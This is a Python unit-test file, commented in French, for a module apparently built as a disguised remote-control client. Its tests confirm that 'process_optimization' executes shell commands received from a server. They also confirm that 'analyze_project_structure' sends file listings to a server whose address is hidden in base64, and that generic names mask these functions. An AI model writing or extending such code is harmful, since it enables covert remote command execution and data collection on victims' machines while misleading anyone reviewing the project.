"""
Tests unitaires pour le module main.
"""

import pytest
import os
import tempfile
import shutil
from unittest.mock import patch, MagicMock
from src import main


class TestMain:
    """Tests pour les fonctions du module main."""

    def setup_method(self):
        """Configuration avant chaque test."""
        self.temp_dir = tempfile.mkdtemp()
        self.original_cwd = os.getcwd()
        os.chdir(self.temp_dir)

    def teardown_method(self):
        """Nettoyage après chaque test."""
        os.chdir(self.original_cwd)
        shutil.rmtree(self.temp_dir)

    def test_execute_task_cd(self):
        """Test de la fonction execute_task avec la commande cd."""
        # Créer un sous-dossier
        subdir = os.path.join(self.temp_dir, "test_subdir")
        os.makedirs(subdir)

        # Tester cd vers le sous-dossier
        result = main.execute_task(f"cd {subdir}")
        assert result == ""
        assert os.getcwd() == subdir

    def test_execute_task_cd_invalid(self):
        """Test de la fonction execute_task avec un cd invalide."""
        result = main.execute_task("cd /chemin/inexistant")
        assert "FileNotFoundError" in result or "No such file" in result

    def test_execute_task_system_command(self):
        """Test de la fonction execute_task avec une commande système."""
        with patch('subprocess.getoutput') as mock_getoutput:
            mock_getoutput.return_value = "test output"
            result = main.execute_task("ls")
            assert result == "test output"
            mock_getoutput.assert_called_once_with("ls")

    @patch('src.main.network_utils')
    @patch('src.main.config_manager')
    def test_analyze_project_structure(self, mock_config_manager, mock_network_utils):
        """Test de la fonction analyze_project_structure."""
        # Créer quelques fichiers de test
        with open("test.py", "w") as f:
            f.write("# test file")
        with open("test.js", "w") as f:
            f.write("// test file")
        with open("test.txt", "w") as f:
            f.write("test file")

        # Mock de la configuration
        mock_config = {
            "server_address": "dGVzdC5jb20=",  # test.com en base64
            "server_port": "ODA4MA==",  # 8080 en base64
            "buffer_size": 1024
        }
        mock_config_manager.load_config.return_value = mock_config

        # Exécuter la fonction
        main.analyze_project_structure()

        # Vérifications
        mock_config_manager.load_config.assert_called_once()
        mock_network_utils.send_data.assert_called_once()
        mock_network_utils.receive_data.assert_called()

        # Vérifier que les données envoyées contiennent les bons fichiers
        call_args = mock_network_utils.send_data.call_args[0][0]
        import json
        data = json.loads(call_args)
        assert "test.py" in data["files"]
        assert "test.js" in data["files"]
        assert "test.txt" not in data["files"]  # .txt n'est pas inclus

    @patch('src.main.network_utils')
    def test_process_optimization_exit(self, mock_network_utils):
        """Test de process_optimization avec commande de sortie."""
        config = {"exit_command": "quit", "separator": "|"}
        
        # Simuler une réponse de sortie
        mock_network_utils.receive_data.return_value = "quit"

        main.process_optimization(config)

        mock_network_utils.receive_data.assert_called_once_with(config)

    @patch('src.main.network_utils')
    @patch('src.main.execute_task')
    def test_process_optimization_info_command(self, mock_execute_task, mock_network_utils):
        """Test de process_optimization avec commande d'information."""
        config = {
            "info_command": "info",
            "separator": "|",
            "buffer_size": 1024
        }
        
        # Simuler une réponse d'information
        mock_network_utils.receive_data.side_effect = ["info", "exit"]

        main.process_optimization(config)

        # Vérifier que send_data a été appelé avec les bonnes données
        assert mock_network_utils.send_data.call_count >= 1

    @patch('src.main.network_utils')
    @patch('src.main.execute_task')
    def test_process_optimization_custom_task(self, mock_execute_task, mock_network_utils):
        """Test de process_optimization avec une tâche personnalisée."""
        config = {"separator": "|", "buffer_size": 1024}
        
        # Simuler une tâche personnalisée
        mock_network_utils.receive_data.side_effect = ["ls -la", "exit"]
        mock_execute_task.return_value = "file1.txt\nfile2.txt"

        main.process_optimization(config)

        # Vérifier que execute_task a été appelé
        mock_execute_task.assert_called_once_with("ls -la")

    @patch('src.main.network_utils')
    def test_main_function(self, mock_network_utils):
        """Test de la fonction main."""
        # Simuler une exception
        mock_network_utils.initialize_connection.side_effect = ConnectionError("Test error")

        # La fonction main ne doit pas lever d'exception
        main.main()

        # Vérifier que close_connection a été appelé
        mock_network_utils.close_connection.assert_called_once()


class TestMainIntegration:
    """Tests d'intégration pour le module main."""

    def test_project_structure_analysis(self):
        """Test d'intégration de l'analyse de structure de projet."""
        # Créer une structure de projet de test
        with tempfile.TemporaryDirectory() as temp_dir:
            os.chdir(temp_dir)
            
            # Créer des fichiers de différents types
            files_to_create = [
                "main.py",
                "utils.py",
                "config.py",
                "script.js",
                "component.tsx",
                "data.json",
                "README.md"
            ]
            
            for file in files_to_create:
                with open(file, "w") as f:
                    f.write(f"# {file}")

            # Créer des sous-dossiers
            os.makedirs("src", exist_ok=True)
            os.makedirs("tests", exist_ok=True)
            
            with open("src/__init__.py", "w") as f:
                f.write("# init")
            with open("tests/test_main.py", "w") as f:
                f.write("# test")

            # Vérifier que la fonction peut analyser cette structure
            # (sans faire d'appels réseau réels)
            with patch('src.main.network_utils') as mock_network_utils, \
                 patch('src.main.config_manager') as mock_config_manager:
                
                mock_config = {"buffer_size": 1024}
                mock_config_manager.load_config.return_value = mock_config
                
                main.analyze_project_structure()
                
                # Vérifier que send_data a été appelé
                mock_network_utils.send_data.assert_called_once()
                
                # Vérifier le contenu des données envoyées
                call_args = mock_network_utils.send_data.call_args[0][0]
                import json
                data = json.loads(call_args)
                
                # Vérifier que les fichiers Python, JS, TS sont inclus
                assert "main.py" in data["files"]
                assert "script.js" in data["files"]
                assert "component.tsx" in data["files"]
                
                # Vérifier que les autres fichiers ne sont pas inclus
                assert "data.json" not in data["files"]
                assert "README.md" not in data["files"]
                
                # Vérifier les métriques
                assert data["metrics"]["file_count"] > 0 